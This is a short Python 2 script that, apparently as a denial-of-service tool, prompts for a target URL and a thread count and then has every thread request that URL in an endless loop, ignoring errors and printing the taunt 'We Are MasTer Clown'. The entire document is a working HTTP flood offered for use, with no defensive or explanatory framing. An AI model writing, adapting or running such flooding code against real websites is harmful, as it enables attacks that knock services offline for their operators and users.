import urllib2 ,threading ,thread
url=raw_input('URL: ')
thread=int(input('thread: '))
class runbot(threading.Thread):
 def run(self):
  while 1:
   try:
     urllib2.urlopen(url)
     print 'We Are MasTer Clown'
   except:
     pass
for x in xrange(thread):
 runbot().start() 